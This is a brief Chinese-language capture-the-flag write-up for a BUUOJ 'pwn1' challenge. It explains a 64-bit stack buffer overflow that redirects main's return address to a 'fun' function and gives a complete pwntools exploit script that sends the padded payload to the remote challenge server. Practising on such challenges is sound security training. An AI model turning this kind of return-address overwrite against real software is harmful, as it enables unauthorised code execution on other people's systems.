    所以我们需要将main函数的返回地址覆盖为fun函数的地址0x401186

    由于是64位程序，所以我们覆盖为0xF * 'a' + 8 * 'b' + 0x40118A(直接覆盖好像不太行)

    exp为

    from pwn import *

#io = process('./pwn1')
io = remote('node3.buuoj.cn', 29755)

system_addr = 0x40118A

payload = 0xF * 'a' + 'b' * 8 + p64(system_addr)

io.sendline(payload)
io.interactive()
